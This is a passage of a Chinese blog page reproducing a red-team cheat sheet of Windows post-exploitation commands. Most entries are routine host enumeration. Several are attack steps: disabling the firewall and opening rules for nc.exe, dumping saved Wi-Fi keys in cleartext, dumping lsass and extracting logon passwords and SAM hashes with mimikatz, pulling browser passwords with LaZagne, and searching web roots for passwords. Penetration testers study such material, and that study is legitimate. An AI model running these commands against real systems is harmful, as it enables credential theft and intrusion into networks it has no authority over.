版本&quot;<br><br># 查看系统体系结构<br>echo %PROCESSOR_ARCHITECTURE%<br></code></pre></td></tr></table></figure>

<h4 id="查看环境变量-set"><a href="#查看环境变量-set" class="headerlink" title="查看环境变量 set"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-set"></a>查看环境变量 set</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">set<br></code></pre></td></tr></table></figure>

<h4 id="查看网络配置信息-ipconfig"><a href="#查看网络配置信息-ipconfig" class="headerlink" title="查看网络配置信息 ipconfig"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF-ipconfig"></a>查看网络配置信息 ipconfig</h4><ul>
<li>域内的DNS服务器即域控。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ipconfig /all<br></code></pre></td></tr></table></figure>

<h4 id="查看当前用户信息-whoami"><a href="#查看当前用户信息-whoami" class="headerlink" title="查看当前用户信息 whoami"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF-whoami"></a>查看当前用户信息 whoami</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">whoami /all<br></code></pre></td></tr></table></figure>

<h4 id="查看路由表-route"><a href="#查看路由表-route" class="headerlink" title="查看路由表 route"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E8%B7%AF%E7%94%B1%E8%A1%A8-route"></a>查看路由表 route</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">route print<br></code></pre></td></tr></table></figure>

<h4 id="查看arp缓存表-arp"><a href="#查看arp缓存表-arp" class="headerlink" title="查看arp缓存表 arp"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8Barp%E7%BC%93%E5%AD%98%E8%A1%A8-arp"></a>查看arp缓存表 arp</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">arp -a<br></code></pre></td></tr></table></figure>

<h4 id="查看用户信息-net-user-x2F-localgroup"><a href="#查看用户信息-net-user-x2F-localgroup" class="headerlink" title="查看用户信息 net user&#x2F;localgroup"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF-net-userlocalgroup"></a>查看用户信息 net user&#x2F;localgroup</h4><ul>
<li>通过分析本机用户列表，可以找出内网机器的命名规则。特别是个人机器的名称，可以用来推测整个域的用户命名方式。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"># 查看指定用户信息<br>net user<br><br># 查看本地组信息<br>net localgroup<br><br># 查看本地管理员用户<br>net localgroup administrators<br><br># 查看当前在线用户<br>query user || qwinsta<br></code></pre></td></tr></table></figure>

<h4 id="查看主机开启时间-net-statistics"><a href="#查看主机开启时间-net-statistics" class="headerlink" title="查看主机开启时间 net statistics"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E4%B8%BB%E6%9C%BA%E5%BC%80%E5%90%AF%E6%97%B6%E9%97%B4-net-statistics"></a>查看主机开启时间 net statistics</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">net statistics workstation<br></code></pre></td></tr></table></figure>

<h4 id="查看安装软件及版本信息-wmic-product"><a href="#查看安装软件及版本信息-wmic-product" class="headerlink" title="查看安装软件及版本信息 wmic product"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E5%AE%89%E8%A3%85%E8%BD%AF%E4%BB%B6%E5%8F%8A%E7%89%88%E6%9C%AC%E4%BF%A1%E6%81%AF-wmic-product"></a>查看安装软件及版本信息 wmic product</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">wmic product get name,version<br></code></pre></td></tr></table></figure>

<h4 id="利用PowerShell收集软件版本信息"><a href="#利用PowerShell收集软件版本信息" class="headerlink" title="利用PowerShell收集软件版本信息"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E5%88%A9%E7%94%A8powershell%E6%94%B6%E9%9B%86%E8%BD%AF%E4%BB%B6%E7%89%88%E6%9C%AC%E4%BF%A1%E6%81%AF"></a>利用PowerShell收集软件版本信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">powershell &quot;Get-WmiObject -class Win32_Product |Select-Object -Property name,version&quot;<br></code></pre></td></tr></table></figure>

<h4 id="查看本机服务信息-wmic-service"><a href="#查看本机服务信息-wmic-service" class="headerlink" title="查看本机服务信息 wmic service"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E6%9C%AC%E6%9C%BA%E6%9C%8D%E5%8A%A1%E4%BF%A1%E6%81%AF-wmic-service"></a>查看本机服务信息 wmic service</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">wmic service list brief<br></code></pre></td></tr></table></figure>

<h4 id="查看补丁信息-wmic-qfe"><a href="#查看补丁信息-wmic-qfe" class="headerlink" title="查看补丁信息 wmic qfe"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E8%A1%A5%E4%B8%81%E4%BF%A1%E6%81%AF-wmic-qfe"></a>查看补丁信息 wmic qfe</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"># 查看补丁信息<br>wmic qfe list<br><br># 查看补丁列表<br>wmic qfe get Caption,Description,HotFixID,InstalledOn<br></code></pre></td></tr></table></figure>

<h5 id="metasploit-enum-patches"><a href="#metasploit-enum-patches" class="headerlink" title="metasploit enum_patches"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#metasploit-enum_patches"></a>metasploit enum_patches</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">meterpreter &gt; run post/windows/gather/enum_patches<br></code></pre></td></tr></table></figure>

<h5 id="windows-exploit-suggester"><a href="#windows-exploit-suggester" class="headerlink" title="windows exploit suggester"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#windows-exploit-suggester"></a>windows exploit suggester</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$ activate py27<br>$ python windows-exploit-suggester.py --update<br>$ pip install xlrd==1.2.0 -i https://pypi.tuna.tsinghua.edu.cn/simple<br>$ python windows-exploit-suggester.py --database 2022-03-16-mssb.xls --systeminfo systeminfo.txt<br></code></pre></td></tr></table></figure>

<h4 id="查看共享列表-wmic-share"><a href="#查看共享列表-wmic-share" class="headerlink" title="查看共享列表 wmic share"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E5%85%B1%E4%BA%AB%E5%88%97%E8%A1%A8-wmic-share"></a>查看共享列表 wmic share</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">wmic share get name,path,status<br></code></pre></td></tr></table></figure>

<h4 id="查看进程列表-tasklist"><a href="#查看进程列表-tasklist" class="headerlink" title="查看进程列表 tasklist"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E8%BF%9B%E7%A8%8B%E5%88%97%E8%A1%A8-tasklist"></a>查看进程列表 tasklist</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"># 查看进程列表<br>tasklist<br><br># 查看当前进程列表所对应的用户身份<br>tasklist /v<br><br># 查看是否有杀软<br>tasklist /svc<br></code></pre></td></tr></table></figure>

<h4 id="查看计划任务-schtasks"><a href="#查看计划任务-schtasks" class="headerlink" title="查看计划任务 schtasks"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1-schtasks"></a>查看计划任务 schtasks</h4><p>通过查看本机计划任务就能知道当前机器上某个时间会运行哪些软件了,就可以利用这一点来做定时任务劫持。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">schtasks /query /fo LIST /v<br></code></pre></td></tr></table></figure>

<h4 id="查看端口信息-netstat"><a href="#查看端口信息-netstat" class="headerlink" title="查看端口信息 netstat"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E7%AB%AF%E5%8F%A3%E4%BF%A1%E6%81%AF-netstat"></a>查看端口信息 netstat</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">netstat -ano<br></code></pre></td></tr></table></figure>

<h4 id="查看防火墙配置-netsh"><a href="#查看防火墙配置-netsh" class="headerlink" title="查看防火墙配置 netsh"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE-netsh"></a>查看防火墙配置 netsh</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"># 关闭防火墙<br>netsh firewall set opmode disable (Windows Server 2003 系统及之前版本)<br>netsh advfirewall set allprofiles state off (Windows Server 2003 系统之后版本)<br><br># 查看防火墙配置<br>netsh firewall show config<br><br># 修改防火墙配置(Windows Server 2003 系统及之前版本)<br># 允许指定程序全部连接<br>netsh firewall add allowedprogram c:\nc.exe &quot;allow nc&quot; enable<br><br># 修改防火墙配置(Windows Server 2003 之后系统版本)<br># 允许指定程序连入<br>netsh advfirewall firewall add rule name=&quot;pass nc&quot; dir=in action=allow program=&quot;C: \nc.exe&quot;<br># 允许指定程序连出<br>netsh advfirewall firewall add rule name=&quot;Allow nc&quot; dir=out action=allow program=&quot;C: \nc.exe&quot;<br># 允许3389端口放行<br>netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow<br><br># 自定义防火墙日志存储位置<br>netsh advfirewall set currentprofile logging filename &quot;C:\windows\temp\fw.log&quot;<br></code></pre></td></tr></table></figure>

<h4 id="查看wifi信息"><a href="#查看wifi信息" class="headerlink" title="查看wifi信息"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8Bwifi%E4%BF%A1%E6%81%AF"></a>查看wifi信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">for /f  &quot;skip=9 tokens=1,2 delims=:&quot; %i in (&#x27;netsh wlan show profiles&#x27;)  do  @echo %j | findstr -i -v echo |  netsh wlan show profiles %j key=clear<br></code></pre></td></tr></table></figure>

<h4 id="查看网络代理信息"><a href="#查看网络代理信息" class="headerlink" title="查看网络代理信息"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86%E4%BF%A1%E6%81%AF"></a>查看网络代理信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;<br></code></pre></td></tr></table></figure>

<h4 id="查看PPTP配置信息"><a href="#查看PPTP配置信息" class="headerlink" title="查看PPTP配置信息"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8Bpptp%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF"></a>查看PPTP配置信息</h4><p>Windows系统拨号和宽带连接的配置信息存储在固定位置，路径如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">%APPDATA%\Microsoft\Network\Connections\Pbk\rasphone.pbk<br></code></pre></td></tr></table></figure>

<p>查看该文件即可获得PPTP连接的配置信息，包括服务器IP，不包含连接用户名和口令。</p>
<h4 id="查看RDP远程桌面信息"><a href="#查看RDP远程桌面信息" class="headerlink" title="查看RDP远程桌面信息"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8Brdp%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E4%BF%A1%E6%81%AF"></a>查看RDP远程桌面信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default&quot;<br></code></pre></td></tr></table></figure>

<h4 id="查看数据库密码"><a href="#查看数据库密码" class="headerlink" title="查看数据库密码"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AF%86%E7%A0%81"></a>查看数据库密码</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">cd /web<br>findstr /s /m &quot;password&quot; *.*<br></code></pre></td></tr></table></figure>

<h4 id="查看服务信息-sc-query"><a href="#查看服务信息-sc-query" class="headerlink" title="查看服务信息 sc query"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E6%9C%8D%E5%8A%A1%E4%BF%A1%E6%81%AF-sc-query"></a>查看服务信息 sc query</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">sc query<br></code></pre></td></tr></table></figure>

<h4 id="导出注册表信息-reg"><a href="#导出注册表信息-reg" class="headerlink" title="导出注册表信息 reg"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E5%AF%BC%E5%87%BA%E6%B3%A8%E5%86%8C%E8%A1%A8%E4%BF%A1%E6%81%AF-reg"></a>导出注册表信息 reg</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">reg export HKLM hklm.reg<br>reg export HKCU hkcu.reg<br></code></pre></td></tr></table></figure>

<h4 id="导出日志信息"><a href="#导出日志信息" class="headerlink" title="导出日志信息"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E5%AF%BC%E5%87%BA%E6%97%A5%E5%BF%97%E4%BF%A1%E6%81%AF"></a>导出日志信息</h4><ul>
<li>导出到本地使用LogParser查看：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">copy C:\Windows\System32\winevt\Logs\System.evtx<br>copy C:\Windows\System32\winevt\Logs\security.evtx<br>copy C:\Windows\System32\winevt\Logs\application.evtx<br></code></pre></td></tr></table></figure>

<h4 id="查看hosts文件"><a href="#查看hosts文件" class="headerlink" title="查看hosts文件"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8Bhosts%E6%96%87%E4%BB%B6"></a>查看hosts文件</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">C:\Windows\System32\drivers\etc\hosts<br></code></pre></td></tr></table></figure>

<h4 id="查看中间件信息"><a href="#查看中间件信息" class="headerlink" title="查看中间件信息"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E4%B8%AD%E9%97%B4%E4%BB%B6%E4%BF%A1%E6%81%AF"></a>查看中间件信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"># 列出网站列表<br>%windir%\system32\inetsrv\AppCmd.exe list site<br><br># 列出网站物理路径<br>%systemroot%\system32\inetsrv\appcmd.exe list vdir<br></code></pre></td></tr></table></figure>

<h4 id="查看组策略-gpresult"><a href="#查看组策略-gpresult" class="headerlink" title="查看组策略 gpresult"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E7%BB%84%E7%AD%96%E7%95%A5-gpresult"></a>查看组策略 gpresult</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"># 生成组策略报表<br>gpresult /h &lt;filename&gt; htm<br></code></pre></td></tr></table></figure>

<h4 id="查看启动项"><a href="#查看启动项" class="headerlink" title="查看启动项"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E5%90%AF%E5%8A%A8%E9%A1%B9"></a>查看启动项</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"># 使用注册表查询<br>reg query HKLM\Software\Microsoft\Windows\CurrentVertion\Run<br></code></pre></td></tr></table></figure>

<h4 id="抓取密码-mimikatz"><a href="#抓取密码-mimikatz" class="headerlink" title="抓取密码 mimikatz"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%8A%93%E5%8F%96%E5%AF%86%E7%A0%81-mimikatz"></a>抓取密码 mimikatz</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">procdump.exe -accepteula -ma lsass.exe lsass.dmp<br><br>mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords&quot; &quot;exit&quot;<br><br>mimikatz &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;sekurlsa::logonpasswords&quot; &quot;lsadump::sam&quot; &quot;exit&quot;<br></code></pre></td></tr></table></figure>

<h4 id="浏览器密码"><a href="#浏览器密码" class="headerlink" title="浏览器密码"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AF%86%E7%A0%81"></a>浏览器密码</h4><p>Chrome中保存的密码先被二次加密，然后被保存在SQLite数据库文件中，位置如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">%LocalAppData%\Google\Chrome\User Data\Default\Login Data<br></code></pre></td></tr></table></figure>

<p>可以使用USBStealter导出浏览器历史记录以及密码。或者使用<a target="_blank" rel="noopener" href="https://github.com/AlessandroZ/LaZagne">https://github.com/AlessandroZ/LaZagne</a>:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">LaZagne.exe browsers-chrome<br></code></pre></td></tr></table></figure>

<p>此工具也支持firefox以及系统中其他密码的导出。</p>
<h4 id="查看回收站"><a href="#查看回收站" class="headerlink" title="查看回收站"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E5%9B%9E%E6%94%B6%E7%AB%99"></a>查看回收站</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">cd C:\$Recycle.Bin\，使用dir /A查看隐藏文件<br>S-1 xxx 分别对应不同用户的回收站<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">procdump dump csrss.exe进程<br></code></pre></td></tr></table></figure>

